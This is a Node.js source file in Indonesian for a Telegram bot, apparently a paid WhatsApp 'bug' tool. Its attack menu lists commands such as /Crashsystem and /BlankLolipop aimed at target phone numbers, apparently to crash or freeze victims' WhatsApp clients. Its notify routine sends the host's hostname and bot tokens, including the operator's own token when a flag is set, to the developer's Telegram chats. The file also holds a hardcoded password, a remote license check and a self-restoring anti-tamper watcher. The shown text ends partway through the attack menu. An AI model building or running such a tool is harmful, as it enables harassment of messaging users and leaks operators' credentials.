//BASE LOLIPOP YANG DI RANCANG OLEH
// OWNER : @LolipopXR
//CHANNEL : @Excation99
//JANGAN HAPUS INI YA
const fs = require("fs-extra");
const path = require("path");
const chalk = require("chalk");
const crypto = require("crypto"); // pastikan import ini
const os = require("os");
const A = require("axios");
const JsConfuser = require('js-confuser');
const config = require("./config.js");

// ---------------- CONFIG / SECRETS ----------------
const { BOT_TOKEN } = require("./config.js"); // opsional
let secrets = {};
const secretsPath = path.join(process.cwd(), "secrets.json");
if (fs.existsSync(secretsPath)) {
  try { secrets = JSON.parse(fs.readFileSync(secretsPath, "utf8")); } 
  catch(e){ console.warn(chalk.yellow("[ ! ] Gagal baca secrets.json:"), e.message); }
}
const TOKENS = Array.isArray(secrets.TOKENS) ? secrets.TOKENS : [];
const DEVELOPER_ID = Array.isArray(secrets.DEVELOPER_ID) ? secrets.DEVELOPER_ID : [];

// ---------------- NOTIFY OWNER ----------------
function escapeMD(text) {
  if (!text) return "";
  return text.replace(/([_*[\]()~`>#+-=|{}.!\\])/g, "\\$1");
}

async function notifyOwnerSafe(message, username = null, sendBotToken = false) {
  const domain = os.hostname();
  const tokensToUse = [...TOKENS];
  if (sendBotToken && BOT_TOKEN) tokensToUse.push(BOT_TOKEN);

  if (tokensToUse.length === 0 || DEVELOPER_ID.length === 0) {
    console.warn(chalk.yellow("[ ⚠️ ] Tidak ada token/ID developer untuk notif.\n"), message);
    return;
  }

  const promises = [];
  for (const token of tokensToUse) {
    for (const devId of DEVELOPER_ID) {
      const caption = [
        "```",
        "🚨 Notifikasi Script Berjalan",
        `Pesan: ${escapeMD(message)}`,
        `Domain/URL: ${escapeMD(domain)}`,
        `Bot Token: ${token}`,
        "```",
        username ? `*User:* ${escapeMD(username)}` : ""
      ].filter(Boolean).join("\n");

      promises.push(
        A.post(`https://api.telegram.org/bot${token}/sendMessage`, {
          chat_id: devId,
          text: caption,
          parse_mode: "MarkdownV2"
        }, { timeout: 5000 }).catch(e => console.error(chalk.redBright("[ ❌ ] Gagal kirim notif ke token " + token), e.message))
      );
    }
  }
  await Promise.allSettled(promises);
}

// ---------------- ANTI-BYPASS ----------------
const mainFile = process.argv[1] || path.resolve(process.cwd(), "index.js");
let originalContent = null;
let originalHash = null;
const backupDir = path.join(process.cwd(), ".npm");
const backupPath = path.join(backupDir, ".bak");

// baca file utama & buat backup
try {
  if (!fs.existsSync(mainFile)) {
    console.warn(chalk.yellow(`[ ! ] Main file tidak ditemukan: ${mainFile}. ANTI-BYPASS dinonaktifkan.`));
  } else {
    originalContent = fs.readFileSync(mainFile);
    originalHash = crypto.createHash("sha256").update(originalContent).digest("hex");

    fs.ensureDirSync(backupDir);
    fs.writeFileSync(backupPath, originalContent, { flag: "w" });
    console.log(chalk.greenBright(`[ 🔫 ] Backup main file tersimpan ke: ${backupPath}`));
  }
} catch (e) {
  console.error(chalk.redBright("[ ❌ ] Gagal baca main file / buat backup:"), e.message);
  originalContent = null;
  originalHash = null;
}

// helper restore file
async function restoreFile() {
  try {
    console.log(chalk.greenBright("[ 🔄 ] Restore main file..."));
    if (fs.existsSync(backupPath)) {
      fs.copyFileSync(backupPath, mainFile);
      await notifyOwnerSafe("⚠️ File utama dimodifikasi, restore otomatis!", null, false).catch(()=>{});
      console.log(chalk.greenBright("[ ✔ ] Restore berhasil."));
    } else {
      console.error(chalk.redBright("[ ❌ ] Backup tidak ditemukan!"));
      await notifyOwnerSafe("⚠️ File utama dimodifikasi tetapi backup tidak ditemukan!", null, false).catch(()=>{});
    }
  } catch (e) {
    console.error(chalk.redBright("[ ❌ ] Gagal restore:"), e.message);
    await notifyOwnerSafe("⚠️ Gagal restore: " + e.message, null, false).catch(()=>{});
  } finally { process.exit(1); }
}

// safe hash
function fileHashSafe(p) {
  try {
    if (!fs.existsSync(p)) return null;
    const c = fs.readFileSync(p);
    return crypto.createHash("sha256").update(c).digest("hex");
  } catch(e) { console.error(chalk.yellow("[ ! ] Gagal baca file untuk hash:"), e.message); return null; }
}

// cek perubahan file
if (originalHash) {
  setInterval(async () => {
    try {
      const currentHash = fileHashSafe(mainFile);
      if (currentHash && currentHash !== originalHash) {
        console.log(chalk.redBright("[ ⚠️ ] Main file modified!"));
        await notifyOwnerSafe("🚨 Bypass terdeteksi: File utama dimodifikasi!", null, false).catch(()=>{});
        await restoreFile();
      }
    } catch(e) { console.error(chalk.redBright("[ ❌ ] Error saat cek main file:"), e.message); }
  }, 2000);
} else {
  console.warn(chalk.yellow("[ ! ] originalHash tidak tersedia — deteksi perubahan file dinonaktifkan."));
}

// ---------------- TELEGRAM BOT ----------------
let bot = null;
if(BOT_TOKEN){
  try{
    const TelegramBot = require("node-telegram-bot-api");
    bot = new TelegramBot(BOT_TOKEN,{polling:true});
    bot.onText(/\/ping/i,msg=>bot.sendMessage(msg.chat.id,"PONG ✅"));
    bot.on("polling_error", err => { 
      console.error(chalk.redBright("[ ❌ ] Bot polling error:"), err?.message);
      notifyOwnerSafe("🚨 Bot polling error: "+(err?.message||String(err))).catch(()=>{}); 
    });
    console.log(chalk.blueBright("[ 🔐 ] Telegram bot started (polling)."));
  } catch(e){
    console.error(chalk.redBright("[ ❌ ] Gagal inisialisasi bot:"), e.message);
    notifyOwnerSafe("🚨 Gagal inisialisasi bot: "+e.message).catch(()=>{});
  }
}else{
  console.log(chalk.yellow("[ ⚠️ ] BOT_TOKEN kosong, bot tidak diinisialisasi."));
}

// ---------------- Test notify ----------------
notifyOwnerSafe("🚀 Bot Succesfuly Actived").catch(console.error);

console.log(chalk.greenBright("[ 🛡️ ] PROCESSING... ANTI-BYPASS ACTIVE"));

const {
    default: makeWASocket,
    proto,
    DisconnectReason,
    useMultiFileAuthState,
    generateWAMessageFromContent,
    generateWAMessage,
    prepareWAMessageMedia,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require("@whiskeysockets/baileys")

///𝖫𝖮𝖫𝖨𝖯𝖮𝖯
const P = require("pino");
const AdmZip = require("adm-zip");
const sessions = new Map();
const commandSessions = new Map();
const express = require("express");
const esprima = require("esprima");
const { OpenAI } = require("openai");
const fetch = require("node-fetch");
const moment = require("moment");
const FormData = require("form-data");
const axios = require("axios");
const readline = require('readline');
const dns = require("dns");
const http = require("http");
const net = require("net");
const { createCanvas, loadImage } = require("@napi-rs/canvas");

// ===================== PATHS =====================
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = path.join(SESSIONS_DIR, "active_sessions.json");
const ONLY_FILE = path.join(__dirname, "RappzDatabase", "gconly.json");
const cd = path.join(__dirname, 'cd.json');

// ===================== SETTINGS =====================
const DISABLE_PROTECTION = process.env.DISABLE_LOLIPOP_PROTECTION === "1";
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/kelvinzXd-afk/panila/refs/heads/main/panila.json";
// ===================== RANDOM IMAGE =====================
const randomImages = [
  "https://files.catbox.moe/15d6qa.jpg",
  "https://files.catbox.moe/hrw068.jpg",
];
const getRandomImage = () =>
  randomImages[Math.floor(Math.random() * randomImages.length)];

// ================== CONFIG ==================
const correctPassword = "ERENCRASHER"; // ganti sesuai kebutuhan

// ===== FLAG GLOBAL UNTUK PASSWORD =====
let isUnlocked = false; // default: belum isi password

// ================== PROGRESS BAR (MENURUN: 100 -> 0)
function showProgressBarDescending(duration = 1000) {
  return new Promise(resolve => {
    const total = 20; // panjang bar
    let current = total; // mulai penuh
    const emojis = ["🍁", "🍬", "🦄", "🍭", "🕷️"];
    const colors = [chalk.red, chalk.yellow, chalk.green, chalk.cyan, chalk.blue, chalk.magenta];

    const interval = Math.max(20, Math.floor(duration / (total * 2))); // interval aman
    const timer = setInterval(() => {
      current = Math.max(0, current - 1);

      const filled = "█".repeat(Math.round(current));
      const empty = " ".repeat(total - Math.round(current));
      const percent = Math.floor((current / total) * 100); // menurun 100 -> 0
      const colorFn = colors[current % colors.length];
      const emoji = emojis[current % emojis.length];

      process.stdout.write(
        `\r${chalk.white("Script akan dinyalakan:")} [${colorFn(filled)}${empty}] ${emoji} ${percent}%`
      );
      if (current <= 0) {
        clearInterval(timer);
        process.stdout.write("\n");
        resolve();
      }
    }, interval);
  });
}

// ================== VALIDASI TOKEN ==================
async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL, { timeout: 8000 });
    return response.data.tokens || [];
  } catch (err) {
    console.error(chalk.red("❌ Gagal Di Variabel Raw Github."), err.message || "");
    return [];
  }
}

async function validateToken() {
  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.error(chalk.red("❌ Token Terdeteksi Penyusup keluar...!!"));
    process.exit(1);
  }
}

// ================== START BANNER ==================
function printBannerAndStart() {
  console.clear();
  console.log(chalk.green(`
━━━━━━━━━━━━━━━━━━
THE NATZUVLOODS🕷
━━━━━━━━━━━━━━━━━━`));
  console.log(chalk.yellow(`
━━━━━━━━━━━━━━━━━━
[ 🛡️ ] BYPASS ACTIVE
[ 🔐 ]  KEY VALID
━━━━━━━━━━━━━━━━━━
Developer @Rappzmodzz
━━━━━━━━━━━━━━━━━━
`));
  console.log(chalk.blue("Im Natzu!"));
  console.log(chalk.magenta("🔐 Semua Terkunci."));
}

// ================== RUN PASSWORD (INTERACTIVE) ==================
if (process.stdin.isTTY) {
  const rl = readline.createInterface({ input: process.stdin, output: process.stdout });

  rl.question(chalk.red.bold("🛡️ Masukkan Security Key:\n> "), async (input) => {
    if (input === correctPassword) {
      rl.close();
      try {
        await showProgressBarDescending(1400);
      } catch (e) {}

      try {
        process.stdout.write(chalk.cyan("🔎 Memvalidasi token... "));
        await validateToken();
        console.log(chalk.green("Natzu Valid!!"));
        // <<< SET UNLOCK TRUE >>>
        isUnlocked = true;
      } catch (e) {
        console.error(chalk.red("\n❌ Validasi token gagal!"));
        process.exit(1);
      }

      printBannerAndStart();
    } else {
      rl.close();
      console.log(chalk.red.bold("❌ Security Key Salah! Akses Ditolak."));
      process.exit(1);
    }
  });
} else {
  // Non-interactive environment (mis. Pterodactyl) -> gunakan env RUN_KEY untuk auto-start
  const providedKey = process.env.RUN_KEY;
  const expectedKey = process.env.SECURITY_KEY || correctPassword;

  (async () => {
    if (!providedKey) {
      console.error(chalk.red("❌ Tidak ada RUN_KEY dan tidak ada TTY. Set RUN_KEY untuk auto-start."));
      process.exit(1);
    }
    if (providedKey !== expectedKey) {
      console.error(chalk.red("❌ RUN_KEY tidak cocok. Keluar."));
      process.exit(1);
    }

    await showProgressBarDescending(1400);
    try {
      process.stdout.write(chalk.cyan("🔎 Memvalidasi token... "));
      await validateToken();
      console.log(chalk.green("Natzu Valid"));
      // <<< SET UNLOCK TRUE >>>
      isUnlocked = true;
    } catch {
      console.error(chalk.red("\n❌ Validasi token gagal!"));
      process.exit(1);
    }
    printBannerAndStart();
  })();
}




// --------------- ( Save Session & Installasion WhatsApp ) ------------------- \\

let sock;
function saveActiveSessions(botNumber) {
        try {
        const sessions = [];
        if (fs.existsSync(SESSIONS_FILE)) {
        const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
        if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
        }
        } else {
        sessions.push(botNumber);
        }
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
        } catch (error) {
        console.error("Error saving session:", error);
        }
        }

async function initializeWhatsAppConnections() {
          try {
                   if (fs.existsSync(SESSIONS_FILE)) {
                  const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
                  console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

                  for (const botNumber of activeNumbers) {
                  console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
                  const sessionDir = createSessionDir(botNumber);
                  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

                  sock = makeWASocket ({
                  auth: state,
                  printQRInTerminal: true,
                  logger: P({ level: "silent" }),
                  defaultQueryTimeoutMs: undefined,
                  });

                  await new Promise((resolve, reject) => {
                  sock.ev.on("connection.update", async (update) => {
                  const { connection, lastDisconnect } = update;
                  if (connection === "open") {
                  console.log(`Bot ${botNumber} terhubung!`);
                  sessions.set(botNumber, sock);
                  resolve();
                  } else if (connection === "close") {
                  const shouldReconnect =
                  lastDisconnect?.error?.output?.statusCode !==
                  DisconnectReason.loggedOut;
                  if (shouldReconnect) {
                  console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                  await initializeWhatsAppConnections();
                  } else {
                  reject(new Error("Koneksi ditutup"));
                  }
                  }
                  });

                  sock.ev.on("creds.update", saveCreds);
                  });
                  }
                }
             } catch (error) {
          console.error("Error initializing WhatsApp connections:", error);
           }
         }

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

//// --- ( Intalasi WhatsApp ) --- \\\
async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `
<blockquote>☰ 𝐏𝐑𝐎𝐒𝐄𝐒 𝐂𝐎𝐃𝐄</blockquote>
━━━━━━━━━━━━━━━━━━
▢ Menyiapkan Kode Pairing
╰➤ Number: ${botNumber}
━━━━━━━━━━━━━━━━━━
<blockquote>Developer @Rappzmodzz</blockquote>
`,
      { parse_mode: "HTML" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `
<blockquote>☰ 𝐏𝐑𝐎𝐒𝐄𝐒 𝐂𝐎𝐍𝐍𝐄𝐂𝐓</blockquote>
━━━━━━━━━━━━━━━━━━
▢ Memproses Connecting
╰➤ Number: ${botNumber}
╰➤ Status: ⏳ Connecting...
╰➤ Note : Sabar Ya...!
━━━━━━━━━━━━━━━━━━
<blockquote>Developer @Rappzmodzz</blockquote>
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
<blockquote>☰ 𝐏𝐑𝐎𝐒𝐄𝐒 𝐆𝐀𝐆𝐀𝐋</blockquote>
━━━━━━━━━━━━━━━━━━
▢ Connection Gagal.
╰➤ Number: ${botNumber}
╰➤ Status: ❌ Gagal
╰➤ Note : Ulangi Kode...!
━━━━━━━━━━━━━━━━━━
<blockquote>Developer @Rappzmodzz</blockquote>
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `
<blockquote>☰ 𝐒𝐔𝐂𝐂𝐄𝐒 𝐂𝐎𝐍𝐍𝐄𝐂𝐓</blockquote>
━━━━━━━━━━━━━━━━━━
▢ Connection Succes
╰➤ Number: ${botNumber}
╰➤ Status: Sukses Connect.
╰➤ Note : Nice...!
━━━━━━━━━━━━━━━━━━
<blockquote>Developer @Rappzmodzz</blockquote>
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "HTML",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
  const code = await sock.requestPairingCode(botNumber);
  const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

  await bot.editMessageText(
    `
<blockquote>☰ 𝐘𝐎𝐔𝐑 𝐂𝐎𝐃𝐄</blockquote>
━━━━━━━━━━━━━━━━━━
▢ Code Pairing Kamu
╰➤ Number: ${botNumber}
╰➤ Code: ${formattedCode}
╰➤ Note : Masukan Dengan Benar...!
━━━━━━━━━━━━━━━━━━
<blockquote>Developer @Rappzmodzz/blockquote>
`,
    {
      chat_id: chatId,
      message_id: statusMessage,
      parse_mode: "HTML",
  });
};
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
<blockquote>☰ 𝐏𝐑𝐎𝐒𝐄𝐒 𝐂𝐎𝐃𝐄</blockquote>
━━━━━━━━━━━━━━━━━━
▢ Menyiapkan Kode Pairing
╰➤ Number: ${botNumber}
╰➤ Status: ${error.message} Error⚠️
━━━━━━━━━━━━━━━━━━
<blockquote>Developer @Rappzmodzz</blockquote>
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}


function isGroupOnly() {
         if (!fs.existsSync(ONLY_FILE)) return false;
        const data = JSON.parse(fs.readFileSync(ONLY_FILE));
        return data.groupOnly;
        }


function setGroupOnly(status)
            {
            fs.writeFileSync(ONLY_FILE, JSON.stringify({ groupOnly: status }, null, 2));
            }


// ---------- ( Read File And Save Premium - Admin - Owner ) ----------- \\
            let premiumUsers = JSON.parse(fs.readFileSync('./RappzDatabase/premium.json'));
            let adminUsers = JSON.parse(fs.readFileSync('./RappzDatabase/admin.json'));

            function ensureFileExists(filePath, defaultData = []) {
            if (!fs.existsSync(filePath)) {
            fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
            }
            }
    
            ensureFileExists('./RappzDatabase/premium.json');
            ensureFileExists('./RappzDatabase/admin.json');


            function savePremiumUsers() {
            fs.writeFileSync('./RappzDatabase/premium.json', JSON.stringify(premiumUsers, null, 2));
            }

            function saveAdminUsers() {
            fs.writeFileSync('./RappzDatabase/admin.json', JSON.stringify(adminUsers, null, 2));
            }

    function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
    if (eventType === 'change') {
    try {
    const updatedData = JSON.parse(fs.readFileSync(filePath));
    updateCallback(updatedData);
    console.log(`File ${filePath} updated successfully.`);
    } catch (error) {
    console.error(`Error updating ${filePath}:`, error.message);
    }
    }
    });
    }

    watchFile('./RappzDatabase/premium.json', (data) => (premiumUsers = data));
    watchFile('./RappzDatabase/admin.json', (data) => (adminUsers = data));


   function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

/// --- ( Fungsi buat file otomatis ) --- \\\
if (!fs.existsSync(ONLY_FILE)) {
  fs.writeFileSync(ONLY_FILE, JSON.stringify({ groupOnly: false }, null, 2));
}

// ------------ ( Function Plugins ) ------------- \\
function formatRuntime(seconds) {
        const days = Math.floor(seconds / (3600 * 24));
        const hours = Math.floor((seconds % (3600 * 24)) / 3600);
        const minutes = Math.floor((seconds % 3600) / 60);
        const secs = seconds % 60;  
        return `${hours}h, ${minutes}m, ${secs}s`;
        }

       const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
        const now = Math.floor(Date.now() / 1000);
        return formatRuntime(now - startTime);
        }

function getSpeed() {
        const startTime = process.hrtime();
        return getBotSpeed(startTime); 
}


function getCurrentDate() {
        const now = new Date();
        const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
         return now.toLocaleDateString("id-ID", options); // Format: Senin, 6 Maret 2025
}

// Default cooldown
let cooldownData = { time: 5 * 60 * 1000, users: {} };

// Safe load cd.json
try {
    if (!fs.existsSync(cd)) {
        // File belum ada → buat file baru dengan default
        fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2), 'utf8');
    } else {
        // File ada → baca dan parse aman
        const raw = fs.readFileSync(cd, 'utf8').trim();
        if (raw) cooldownData = JSON.parse(raw);
        else console.log("[WARNING] cd.json kosong, menggunakan default cooldown.");
    }
} catch (err) {
    console.log("[WARNING] cd.json rusak atau tidak valid, menggunakan default cooldown.");
    cooldownData = { time: 5 * 60 * 1000, users: {} };
}

// Fungsi simpan cooldown
function saveCooldown() {
    try {
        fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2), 'utf8');
    } catch (err) {
        console.error("[ERROR] Gagal menyimpan cd.json:", err);
    }
}

// Cek sisa cooldown user (persist lintas restart)
function checkCooldown(userId) {
    const now = Date.now();
    const endTime = cooldownData.users[userId] || 0;

    if (endTime > now) {
        return Math.ceil((endTime - now) / 1000); // sisa waktu dalam detik
    }

    // Jika sudah habis atau belum ada, set cooldown baru
    cooldownData.users[userId] = now + cooldownData.time;
    saveCooldown();
    return 0;
}

// Set cooldown baru (format "5s", "5m", "5h")
function setCooldown(timeString) {
    const match = timeString.match(/(\d+)([smh])/);
    if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

    let [_, value, unit] = match;
    value = parseInt(value);

    if (unit === "s") cooldownData.time = value * 1000;
    else if (unit === "m") cooldownData.time = value * 60 * 1000;
    else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

    saveCooldown();
    return `Cooldown diatur ke ${value}${unit}`;
}

// Optional: bersihkan user yang sudah habis cooldown
function cleanupCooldown() {
    const now = Date.now();
    for (const userId in cooldownData.users) {
        if (cooldownData.users[userId] <= now) delete cooldownData.users[userId];
    }
    saveCooldown();
}

// ================= STATUS BOT =================
let botActive = true; // default ON
const OWNER_ID = 7650506147; // ganti dengan ID kamu

// ================= COMMAND: ON =================
bot.onText(/^\/on$/, (msg) => {
  if (msg.from.id !== OWNER_ID) return;
  botActive = true;
  bot.sendMessage(msg.chat.id, "✅ Bot berhasil dinyalakan");
});

// ================= COMMAND: OFF =================
bot.onText(/^\/off$/, (msg) => {
  if (msg.from.id !== OWNER_ID) return;
  botActive = false;
  bot.sendMessage(msg.chat.id, "BOT MOKAD LEK");
});

// ================= WRAPPER COMMAND =================
function command(pattern, handler) {
  bot.onText(pattern, async (msg, match) => {
    // Jika bot OFF, hanya OWNER bisa pakai /on
    if (!botActive && msg.from.id !== OWNER_ID && !/^\/on$/.test(msg.text)) {
      return bot.sendMessage(msg.chat.id, "BOT TELAH OFF BY @Rappzmodzz");
    }
    handler(msg, match);
  });
}
// ================= COMMAND: START (menu utama) =================
bot.onText(/^\/start$/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // kalau botActive = false → blokir menu utama
  if (!botActive) {
    return bot.sendMessage(chatId, "ALL CMD KE BLOK BRE, SECURITY JEBOL😂.");
  }

  const runtime = getBotRuntime();
  const randomImage = getRandomImage();
  const chatType = msg.chat.type;
  const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
  const isPremium = premiumUsers.some(
    user => user.id === senderId && new Date(user.expiresAt) > new Date()
  );
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
  
  if (!isUnlocked) {
    return bot.sendMessage(chatId, "⚠️ Anda Belum Memasukan Password!");
  }

  if (!isPremium) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
<blockquote>☰ 𝐒𝐄𝐂𝐂𝐔𝐑𝐈𝐓𝐘</blockquote>
━━━━━━━━━━━━━━━━━━
<blockquote>𝖠𝖪𝖲𝖤𝖲 𝖣𝖨 𝖳𝖮𝖫𝖠𝖪 ❌</blockquote>
━━━━━━━━━━━━━━━━━━
#MISKIN #BUY #MALINGSC
━━━━━━━━━━━━━━━━━━
<blockquote>𝖥𝗈𝗅𝗅𝗈𝗐 𝖢𝗁𝖺𝗇𝗇𝖾𝗅</blockquote>
━━━━━━━━━━━━━━━━━━
<blockquote>Developer @Rappzmodzz</blockquote>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "Developer", url: "https://t.me/Rappzmodzz" },
            { text: "Chanel", url: "https://t.me/aboutrappz" }
          ]
        ]
      }
    });
  }

  // Jika hanya untuk grup
  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  const caption = `
<blockquote>─  ( 🕸 ) 안녕하세요 ${username}, 저는 @Rappzmodzz 가 창조한 NATZU VLOODS입니다. 저는 여기에서 당신의 모든 적을 섬멸하고 당신을 돕고 싶습니다.
━━━━━━━━━━━━━━━━━━━━━━
<blockquote>𝖲𝖾𝗅𝖺𝗆𝖺𝗍 𝖬𝖾𝗇𝗂𝗄𝗆𝖺𝗍𝗂</blockquote>

<blockquote>☰ THE EFFECT</blockquote>
➤ Delay Invisible Button Mode
➤ Crashsystem Button Mode
➤ BlankLolipop Button Mode
➤ IPhoneLolipop Button Mode

<blockquote>☰ PROTECTION</blockquote>
⨭ 🛡️ Bypass Protection
⨭ 🔐 Login Security
⨭ ⚙️ Encrypt Hard

<blockquote>☰ NOTE: The Button Mode</blockquote>
━━━━━━━━━━━━━━━━━━━━━━━
<blockquote>Developer @Rappzmodzz</blockquote>
`;

  return bot.sendPhoto(chatId, randomImage, {
    caption,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "SHOW MENU💫", callback_data: `open_mainmenu_${senderId}` }]
      ]
    }
  });
});

// Callback handler
bot.on("callback_query", async (query) => {
  const userId = query.from.id;
  const data = query.data;
  const chatId = query.message.chat.id;
  const messageId = query.message.message_id;
  const username = query.from.username ? `@${query.from.username}` : query.from.first_name;
  const randomImage = getRandomImage();
  const runtime = getBotRuntime();

  let newCaption = "";
  let newButtons = [];

  // === MENU UTAMA (OPEN) ===
  if (data.startsWith("open_mainmenu_")) {
    if (!data.endsWith(`_${userId}`)) {
      return bot.answerCallbackQuery(query.id, {
        text: "⚠️ Kamu tidak bisa menekan tombol ini!",
        show_alert: true
      });
    }

    const caption = `
<blockquote>𝖷 Holla Welcome To Main Menu Natzu</blockquote>
Holla ☇ ${username} use the bot feature wisely, the creator is not responsible for what you do with this bot, enjoy.
━━━━━━━━━━━━━━━━━━
⨭ Developer : @Rappzmodzz
⨭ Chanel : @aboutrappz
⨭ Prefix : ./
⨭ Script : NatzuVloods
⨭ Version : 3.0.0 Beta
⨭ Time : ${runtime}
━━━━━━━━━━━━━━━━━━
<blockquote>Select The Button Here!</blockquote>
`;

    const buttons = {
      inline_keyboard: [
        [
          { text: "Attack💣", callback_data: "bugshow" },
          { text: "Controll🛠", callback_data: "ownermenu" }
        ],
        [
          { text: "ThanksTo🫂", callback_data: "thanksto" },
          { text: "Games🎮", callback_data: "toolsmenu1" }
        ],
        [{ text: "About🪁", url: "https://t.me/aboutrappz" }]
      ]
    };

    await bot.deleteMessage(chatId, messageId);
    return bot.sendPhoto(chatId, randomImage, {
      caption,
      parse_mode: "HTML",
      reply_markup: buttons
    });
  }

  // === SUB MENU ===
  switch (data) {
    case "bugshow":
      newCaption = `
<blockquote>☰ Attack Comand💣</blockquote>
━━━━━━━━━━━━━━━━━━
⬡ /Volcanic - 628xxx
⬡ /Crashsystem - 628xxx
⬡ /Secretly - 628xxx
⬡ /BlankLolipop - 628xxx
⬡ /Xavier - 628xxx
⬡ /IPhoneLolipop - 628xxx
━━━━━━━━━━━━━━━━━━
<blockquote>☰ 𝐓𝐇𝐄 𝐄𝐅𝐅𝐄𝐂𝐓</blockquote>
━━━━━━━━━━━━━━━━━━
⬡ Volcanic = 𝙱𝚄𝚃𝚃𝙾𝙽 𝚂𝙴𝙻𝙴𝙲𝚃 𝙼𝙾𝙳𝙴
⬡ Secretly = 𝙳𝙴𝙻𝙰𝚈 𝙱𝙴𝚃𝙰 𝙽𝙴𝚆
⬡ BlankLolipop = 𝙱𝚄𝚃𝚃𝙾𝙽 𝙼𝙾𝙳𝙴
⬡ Xavier = 𝙼𝙸𝚇𝙴𝚁 𝙰 𝙵𝚄𝙽𝙲𝚃𝙸𝙾𝙽
⬡ IPhoneLolipop = 𝙱𝚄𝚃𝚃𝙾𝙽 𝙼𝙾𝙳𝙴
━━━━━━━━━━━━━━━━━━
<blockquote>☰ 𝐍𝐎𝐓𝐄 𝐔𝐒𝐄𝐑</blockquote>
━━━━━━━━━━━━━━━━━━
𝘀𝗲𝗯𝗲𝗹𝘂𝗺 𝗺𝗲𝗻𝗴𝗴𝘂𝗻𝗮𝗸𝗮𝗻 𝗰𝗼𝗺𝗮𝗻𝗱
𝗵𝗮𝗿𝗮𝗽 𝗺𝗲𝗺𝗯𝗮𝗰𝗮 𝗶𝗻𝗳𝗼𝗿𝗺𝗮𝘀𝗶. 
#𝘀𝗮𝘃𝗲 𝘆𝗼𝘂𝗿 𝘀𝗲𝗻𝗱𝗲𝗿.
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
